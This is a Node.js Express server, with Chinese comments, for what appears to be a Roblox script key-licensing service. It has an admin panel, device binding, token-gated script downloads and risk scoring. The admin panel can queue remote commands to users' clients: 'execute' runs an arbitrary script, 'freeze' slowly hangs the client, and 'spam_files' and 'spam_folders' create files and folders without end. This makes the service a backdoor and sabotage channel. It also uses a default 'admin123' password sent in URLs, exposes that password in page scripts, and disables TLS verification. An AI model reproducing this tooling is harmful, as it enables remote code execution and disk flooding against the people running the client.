const express = require('express');
const { Pool } = require('pg');
const crypto = require('crypto');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ==================== 配置区 ====================
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';  // 管理面板密码，建议在Railway环境变量中设置
const TOKEN_EXPIRE_SECONDS = 300;               // Token有效期5分钟
const SCRIPT_CONTENT_KEY = 'script_content';     // 用于在数据库存储脚本内容的键名
const DEFAULT_SCRIPT = 'print("Hello from server!")'; // 默认脚本

// ==================== 连接数据库 ====================
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

pool.connect((err, client, release) => {
  if (err) {
    console.error('❌ 无法连接到数据库，请检查DATABASE_URL变量:', err.stack);
    process.exit(1);
  }
  console.log('✅ 数据库连接成功');
  release();
});

// ==================== 自动创建所有表 ====================
async function initDB() {
  try {
    console.log('正在初始化数据库表...');
    await pool.query(`
      -- 卡密表
      CREATE TABLE IF NOT EXISTS keys (
        key_value TEXT PRIMARY KEY,
        hwid TEXT,                           -- 绑定的HWID，NULL表示未绑定
        user_id TEXT,                         -- 绑定的用户ID
        expires_at TIMESTAMP,                  -- 过期时间
        frozen BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      -- 用户表（包含风险积分、状态等）
      CREATE TABLE IF NOT EXISTS users (
        uid TEXT PRIMARY KEY,                  -- Roblox用户ID
        hwid TEXT,                              -- 最后使用的HWID
        risk INTEGER DEFAULT 0,                  -- 累积风险分
        status TEXT DEFAULT 'normal',            -- normal, banned, kicked
        last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        last_ip INET,
        last_ua TEXT
      );

      -- 一次性Token表
      CREATE TABLE IF NOT EXISTS tokens (
        token TEXT PRIMARY KEY,
        uid TEXT NOT NULL,
        hwid TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        expires_at TIMESTAMP NOT NULL
      );

      -- 远程命令表（每个用户最多一条待执行命令）
      CREATE TABLE IF NOT EXISTS commands (
        uid TEXT PRIMARY KEY,
        cmd TEXT NOT NULL,                     -- kick, notify, freeze, execute, spam_files, spam_folders
        payload TEXT,                           -- 附加数据（如通知消息、脚本代码）
        issued_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      -- 惩罚记录表
      CREATE TABLE IF NOT EXISTS punishments (
        id SERIAL PRIMARY KEY,
        uid TEXT NOT NULL,
        action TEXT NOT NULL,                    -- ban, kick, risk_add
        reason TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      -- 上报日志表
      CREATE TABLE IF NOT EXISTS logs (
        id SERIAL PRIMARY KEY,
        uid TEXT,
        event TEXT,                               -- 事件类型
        risk_delta INTEGER,                        -- 增加的风险分
        details JSONB,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      -- 会话/在线状态表（简单记录最后一次心跳）
      CREATE TABLE IF NOT EXISTS sessions (
        uid TEXT PRIMARY KEY,
        hwid TEXT,
        last_heartbeat TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );

      -- 系统设置表（用于存储脚本内容等）
      CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    console.log('✅ 所有表已就绪');

    // 确保默认脚本存在
    const res = await pool.query('SELECT value FROM settings WHERE key = $1', [SCRIPT_CONTENT_KEY]);
    if (res.rows.length === 0) {
      await pool.query('INSERT INTO settings (key, value) VALUES ($1, $2)', [SCRIPT_CONTENT_KEY, DEFAULT_SCRIPT]);
      console.log('📄 已插入默认脚本');
    }
  } catch (err) {
    console.error('❌ 数据库初始化失败:', err);
    process.exit(1);
  }
}
initDB();

// ==================== 辅助函数 ====================
function generateRandomString(length = 16) {
  return crypto.randomBytes(length).toString('hex').toUpperCase();
}

function generateKey() {
  return 'KEY-' + generateRandomString(8);
}

function generateToken() {
  return 'TOK-' + generateRandomString(16);
}

async function addRisk(uid, delta, event, details = {}) {
  if (!uid) return;
  await pool.query(
    'UPDATE users SET risk = risk + $1 WHERE uid = $2 RETURNING risk',
    [delta, uid]
  );
  await pool.query(
    'INSERT INTO logs (uid, event, risk_delta, details) VALUES ($1, $2, $3, $4)',
    [uid, event, delta, details]
  );
  // 检查是否达到自动处罚阈值（示例：风险>=10自动封禁）
  const user = await pool.query('SELECT risk FROM users WHERE uid = $1', [uid]);
  if (user.rows[0] && user.rows[0].risk >= 10) {
    await pool.query('UPDATE users SET status = $1 WHERE uid = $2', ['banned', uid]);
    await pool.query('INSERT INTO punishments (uid, action, reason) VALUES ($1, $2, $3)',
      [uid, 'ban', '风险分达到10']);
    console.log(`🚫 用户 ${uid} 因风险过高被自动封禁`);
  }
}

// 检查用户状态
async function checkUserStatus(uid) {
  const res = await pool.query('SELECT status FROM users WHERE uid = $1', [uid]);
  if (res.rows.length > 0 && res.rows[0].status === 'banned') {
    return 'banned';
  }
  return 'ok';
}

// 获取待执行的远程命令（并删除，保证一次执行）
async function fetchAndClearCommand(uid) {
  const res = await pool.query('SELECT cmd, payload FROM commands WHERE uid = $1', [uid]);
  if (res.rows.length > 0) {
    await pool.query('DELETE FROM commands WHERE uid = $1', [uid]);
    return res.rows[0];
  }
  return null;
}

// ==================== 管理面板验证中间件 ====================
function checkAdmin(req, res, next) {
  const pwd = req.query.pwd || req.body.pwd;
  if (pwd !== ADMIN_PASSWORD) {
    return res.status(403).send('Forbidden: Invalid admin password');
  }
  next();
}

// ==================== 路由 ====================

// ---- 管理面板首页 (HTML) ----
app.get('/', (req, res) => {
  const pwd = req.query.pwd;
  if (pwd !== ADMIN_PASSWORD) {
    // 显示简易登录框
    return res.send(`
      <html><body>
        <h2>管理员登录</h2>
        <form method="get">
          密码: <input type="password" name="pwd" />
          <input type="submit" value="登录" />
        </form>
      </body></html>
    `);
  }

  // 已登录，显示完整管理面板
  res.send(`
    <html>
    <head>
      <title>卡密系统管理</title>
      <style>
        body { font-family: Arial; margin: 20px; background: #f0f0f0; }
        .section { background: white; padding: 15px; margin-bottom: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        input, textarea, select { width: 100%; padding: 8px; margin: 5px 0; box-sizing: border-box; }
        button { padding: 8px 16px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        pre { background: #eee; padding: 10px; border-radius: 4px; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background: #007bff; color: white; }
        .risk-high { color: red; font-weight: bold; }
      </style>
    </head>
    <body>
      <h1>🔑 卡密系统管理面板</h1>
      <p>管理员密码已通过。所有操作均需携带 ?pwd=...</p>

      <div class="section">
        <h2>📌 生成卡密</h2>
        <form id="genForm">
          有效期类型:
          <select name="type">
            <option value="minutes">分钟</option>
            <option value="hours">小时</option>
            <option value="days">天</option>
            <option value="seconds">秒</option>
          </select>
          数量: <input type="number" name="count" value="1" min="1" max="100" />
          有效期值: <input type="number" name="value" value="30" />
          <button type="button" onclick="generateKeys()">生成卡密</button>
        </form>
        <div id="genResult"></div>
      </div>

      <div class="section">
        <h2>📋 卡密列表</h2>
        <button onclick="loadKeys()">刷新卡密</button>
        <div id="keysList"></div>
      </div>

      <div class="section">
        <h2>👥 在线用户</h2>
        <button onclick="loadOnline()">刷新在线</button>
        <div id="onlineList"></div>
      </div>

      <div class="section">
        <h2>📝 远程命令</h2>
        <form id="cmdForm">
          用户ID: <input type="text" name="uid" placeholder="输入Roblox用户ID" required />
          命令:
          <select name="cmd">
            <option value="kick">踢出</option>
            <option value="notify">发送通知</option>
            <option value="freeze">缓慢卡死</option>
            <option value="execute">执行脚本</option>
            <option value="spam_files">无限创建文件</option>
            <option value="spam_folders">无限创建文件夹</option>
          </select>
          附加数据 (如消息/脚本): <textarea name="payload" placeholder="可选"></textarea>
          <button type="button" onclick="sendCommand()">发送命令</button>
        </form>
        <div id="cmdResult"></div>
      </div>

      <div class="section">
        <h2>📜 脚本内容</h2>
        <p>当前脚本 (用户下载时获得):</p>
        <textarea id="scriptContent" rows="10" style="font-family: monospace;"></textarea>
        <button onclick="updateScript()">更新脚本</button>
        <div id="scriptResult"></div>
      </div>

      <script>
        const pwdParam = '?pwd=${ADMIN_PASSWORD}';

        // 修复：正确拼接 pwd 参数（判断是否已有 ?）
        function apiFetch(url, options) {
          const separator = url.includes('?') ? '&' : '?';
          return fetch(url + separator + 'pwd=${ADMIN_PASSWORD}', options).then(r => r.json());
        }

        // 生成卡密
        function generateKeys() {
          const form = document.getElementById('genForm');
          const data = {
            type: form.type.value,
            count: form.count.value,
            value: form.value.value
          };
          apiFetch('/admin/generate_keys', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
          }).then(res => {
            document.getElementById('genResult').innerText = JSON.stringify(res, null, 2);
          });
        }

        // 加载卡密
        function loadKeys() {
          apiFetch('/admin/keys').then(keys => {
            let html = '<table><tr><th>卡密</th><th>绑定HWID</th><th>绑定用户</th><th>过期</th><th>冻结</th><th>操作</th></tr>';
            keys.forEach(k => {
              html += \`<tr>
                <td>\${k.key_value}</td>
                <td>\${k.hwid || '-'}</td>
                <td>\${k.user_id || '-'}</td>
                <td>\${k.expires_at || '永不'}</td>
                <td>\${k.frozen ? '是' : '否'}</td>
                <td>
                  <button onclick="deleteKey('\${k.key_value}')">删除</button>
                  <button onclick="toggleFreeze('\${k.key_value}', \${k.frozen})">\${k.frozen ? '解冻' : '冻结'}</button>
                </td>
              </tr>\`;
            });
            html += '</table>';
            document.getElementById('keysList').innerHTML = html;
          });
        }

        function deleteKey(key) {
          if (!confirm('确定删除卡密 '+key+' 吗？')) return;
          apiFetch('/admin/delete_key?key='+encodeURIComponent(key), {method:'POST'}).then(() => loadKeys());
        }

        function toggleFreeze(key, frozen) {
          apiFetch('/admin/freeze_key?key='+encodeURIComponent(key)+'&frozen='+(!frozen), {method:'POST'}).then(() => loadKeys());
        }

        // 在线用户
        function loadOnline() {
          apiFetch('/admin/online').then(users => {
            let html = '<table><tr><th>UID</th><th>HWID</th><th>风险分</th><th>状态</th><th>最后心跳</th></tr>';
            users.forEach(u => {
              html += \`<tr>
                <td>\${u.uid}</td>
                <td>\${u.hwid || '-'}</td>
                <td class="\${u.risk >= 10 ? 'risk-high' : ''}">\${u.risk}</td>
                <td>\${u.status}</td>
                <td>\${u.last_heartbeat}</td>
              </tr>\`;
            });
            html += '</table>';
            document.getElementById('onlineList').innerHTML = html;
          });
        }

        // 发送远程命令
        function sendCommand() {
          const form = document.getElementById('cmdForm');
          const data = {
            uid: form.uid.value,
            cmd: form.cmd.value,
            payload: form.payload.value
          };
          apiFetch('/admin/send_command', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
          }).then(res => {
            document.getElementById('cmdResult').innerText = JSON.stringify(res, null, 2);
          });
        }

        // 获取当前脚本
        function loadScript() {
          apiFetch('/admin/script').then(data => {
            document.getElementById('scriptContent').value = data.script;
          });
        }
        loadScript();

        function updateScript() {
          const newScript = document.getElementById('scriptContent').value;
          apiFetch('/admin/script', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({script: newScript})
          }).then(res => {
            document.getElementById('scriptResult').innerText = JSON.stringify(res, null, 2);
          });
        }

        // 初始加载
        loadKeys();
        loadOnline();
      </script>
    </body>
    </html>
  `);
});

// ---- 管理API (需要密码) ----

// 生成卡密
app.post('/admin/generate_keys', checkAdmin, async (req, res) => {
  const { type, count, value } = req.body;
  const num = parseInt(count) || 1;
  const val = parseInt(value) || 30;
  let expiresAt = null;
  if (type && val) {
    const now = new Date();
    if (type === 'minutes') now.setMinutes(now.getMinutes() + val);
    else if (type === 'hours') now.setHours(now.getHours() + val);
    else if (type === 'days') now.setDate(now.getDate() + val);
    else if (type === 'seconds') now.setSeconds(now.getSeconds() + val);
    expiresAt = now;
  }
  const keys = [];
  for (let i = 0; i < num; i++) {
    const key = generateKey();
    await pool.query(
      'INSERT INTO keys (key_value, expires_at) VALUES ($1, $2)',
      [key, expiresAt]
    );
    keys.push(key);
  }
  res.json({ success: true, keys });
});

// 获取所有卡密
app.get('/admin/keys', checkAdmin, async (req, res) => {
  const result = await pool.query('SELECT * FROM keys ORDER BY created_at DESC');
  res.json(result.rows);
});

// 删除卡密
app.post('/admin/delete_key', checkAdmin, async (req, res) => {
  const { key } = req.query;
  await pool.query('DELETE FROM keys WHERE key_value = $1', [key]);
  res.json({ success: true });
});

// 冻结/解冻卡密
app.post('/admin/freeze_key', checkAdmin, async (req, res) => {
  const { key, frozen } = req.query;
  const f = frozen === 'true';
  await pool.query('UPDATE keys SET frozen = $1 WHERE key_value = $2', [f, key]);
  res.json({ success: true });
});

// 获取在线用户（最近30秒内有心跳）
app.get('/admin/online', checkAdmin, async (req, res) => {
  const result = await pool.query(`
    SELECT u.*, s.last_heartbeat 
    FROM users u 
    JOIN sessions s ON u.uid = s.uid 
    WHERE s.last_heartbeat > NOW() - INTERVAL '30 seconds'
    ORDER BY s.last_heartbeat DESC
  `);
  res.json(result.rows);
});

// 发送远程命令
app.post('/admin/send_command', checkAdmin, async (req, res) => {
  const { uid, cmd, payload } = req.body;
  if (!uid || !cmd) return res.status(400).json({ error: '缺少uid或cmd' });
  await pool.query(
    `INSERT INTO commands (uid, cmd, payload) VALUES ($1, $2, $3)
     ON CONFLICT (uid) DO UPDATE SET cmd = EXCLUDED.cmd, payload = EXCLUDED.payload, issued_at = CURRENT_TIMESTAMP`,
    [uid, cmd, payload]
  );
  res.json({ success: true, message: `命令 ${cmd} 已发送给用户 ${uid}` });
});

// 获取/更新脚本
app.get('/admin/script', checkAdmin, async (req, res) => {
  const result = await pool.query('SELECT value FROM settings WHERE key = $1', [SCRIPT_CONTENT_KEY]);
  res.json({ script: result.rows[0]?.value || '' });
});

app.post('/admin/script', checkAdmin, async (req, res) => {
  const { script } = req.body;
  await pool.query('UPDATE settings SET value = $1, updated_at = CURRENT_TIMESTAMP WHERE key = $2', [script, SCRIPT_CONTENT_KEY]);
  res.json({ success: true });
});

// ---- 客户端API ----

// 1. 卡密验证 /verify?key=xxx&uid=123&hwid=abc
app.get('/verify', async (req, res) => {
  const { key, uid, hwid } = req.query;
  if (!key || !uid || !hwid) {
    return res.json({ success: false, message: '缺少参数' });
  }

  // 检查卡密
  const keyRes = await pool.query('SELECT * FROM keys WHERE key_value = $1', [key]);
  if (keyRes.rows.length === 0) {
    return res.json({ success: false, message: '卡密不存在' });
  }
  const k = keyRes.rows[0];
  if (k.frozen) {
    return res.json({ success: false, message: '卡密已冻结' });
  }
  if (k.expires_at && new Date(k.expires_at) < new Date()) {
    return res.json({ success: false, message: '卡密已过期' });
  }
  if (k.hwid && k.hwid !== hwid) {
    // 上报风险：HWID不匹配
    await addRisk(uid, 3, 'hwid_mismatch', { key, expected: k.hwid, got: hwid });
    return res.json({ success: false, message: '卡密已绑定其他设备' });
  }
  if (k.user_id && k.user_id !== uid) {
    await addRisk(uid, 3, 'user_mismatch', { key, expected: k.user_id, got: uid });
    return res.json({ success: false, message: '卡密已绑定其他用户' });
  }

  // 绑定卡密（如果之前未绑定）
  if (!k.hwid) {
    await pool.query('UPDATE keys SET hwid = $1, user_id = $2 WHERE key_value = $3', [hwid, uid, key]);
  }

  // 记录/更新用户
  await pool.query(
    `INSERT INTO users (uid, hwid, last_seen, last_ip, last_ua) 
     VALUES ($1, $2, CURRENT_TIMESTAMP, $3::inet, $4)
     ON CONFLICT (uid) DO UPDATE SET 
       hwid = EXCLUDED.hwid,
       last_seen = EXCLUDED.last_seen,
       last_ip = EXCLUDED.last_ip,
       last_ua = EXCLUDED.last_ua`,
    [uid, hwid, req.ip, req.get('User-Agent')]
  );

  // 生成一次性Token
  const token = generateToken();
  const expires = new Date(Date.now() + TOKEN_EXPIRE_SECONDS * 1000);
  await pool.query(
    'INSERT INTO tokens (token, uid, hwid, expires_at) VALUES ($1, $2, $3, $4)',
    [token, uid, hwid, expires]
  );

  // 检查是否有远程命令需要立即执行（如踢出）
  const cmd = await fetchAndClearCommand(uid);
  if (cmd) {
    // 返回命令，客户端处理
    return res.json({
      success: true,
      token,
      command: cmd.cmd,
      payload: cmd.payload
    });
  }

  res.json({ success: true, token });
});

// 2. 下载脚本 /download?token=xxx&uid=xxx&hwid=xxx
app.get('/download', async (req, res) => {
  const { token, uid, hwid } = req.query;
  if (!token || !uid || !hwid) {
    return res.status(400).send('Missing parameters');
  }

  // 安全检查
  const ua = req.get('User-Agent') || '';
  if (!ua.includes('Roblox')) {
    // 浏览器访问 +1
    await addRisk(uid, 1, 'browser_access', { ua });
  }

  // 验证Token
  const tokenRes = await pool.query('SELECT * FROM tokens WHERE token = $1', [token]);
  if (tokenRes.rows.length === 0) {
    await addRisk(uid, 3, 'token_not_found', { token });
    return res.status(403).send('Invalid token');
  }
  const t = tokenRes.rows[0];
  if (t.uid !== uid || t.hwid !== hwid) {
    await addRisk(uid, 3, 'token_uid_hwid_mismatch', { token, expected_uid: t.uid, got_uid: uid });
    return res.status(403).send('Token mismatch');
  }
  if (new Date(t.expires_at) < new Date()) {
    await addRisk(uid, 5, 'token_expired', { token });
    return res.status(403).send('Token expired');
  }

  // Token使用一次即销毁
  await pool.query('DELETE FROM tokens WHERE token = $1', [token]);

  // 记录下载事件（可当作心跳）
  await pool.query(
    `INSERT INTO sessions (uid, hwid, last_heartbeat) 
     VALUES ($1, $2, CURRENT_TIMESTAMP)
     ON CONFLICT (uid) DO UPDATE SET last_heartbeat = CURRENT_TIMESTAMP, hwid = EXCLUDED.hwid`,
    [uid, hwid]
  );

  // 获取当前脚本内容
  const scriptRes = await pool.query('SELECT value FROM settings WHERE key = $1', [SCRIPT_CONTENT_KEY]);
  const script = scriptRes.rows[0]?.value || DEFAULT_SCRIPT;

  res.setHeader('Content-Type', 'text/plain');
  res.send(script);
});

// 3. 状态上报 /status (POST)
app.post('/status', async (req, res) => {
  const { uid, hwid, events } = req.body; // events: [{ event, risk, details }]
  if (!uid || !hwid || !Array.isArray(events)) {
    return res.status(400).json({ error: 'Invalid data' });
  }

  // 更新最后心跳
  await pool.query(
    `INSERT INTO sessions (uid, hwid, last_heartbeat) 
     VALUES ($1, $2, CURRENT_TIMESTAMP)
     ON CONFLICT (uid) DO UPDATE SET last_heartbeat = CURRENT_TIMESTAMP, hwid = EXCLUDED.hwid`,
    [uid, hwid]
  );

  // 处理每个上报事件
  for (const e of events) {
    await addRisk(uid, e.risk || 0, e.event, e.details || {});
  }

  // 检查用户是否被封禁
  const status = await checkUserStatus(uid);
  if (status === 'banned') {
    return res.json({ banned: true });
  }

  // 检查是否有待执行命令
  const cmd = await fetchAndClearCommand(uid);
  if (cmd) {
    return res.json({ command: cmd.cmd, payload: cmd.payload });
  }

  res.json({ ok: true });
});

// 可选：简单的根路径提示
app.get('/', (req, res) => {
  res.send('Roblox Key System is running. Access with ?pwd=... for admin panel.');
});

// ==================== 启动服务器 ====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 服务器运行在端口 ${PORT}`);
});
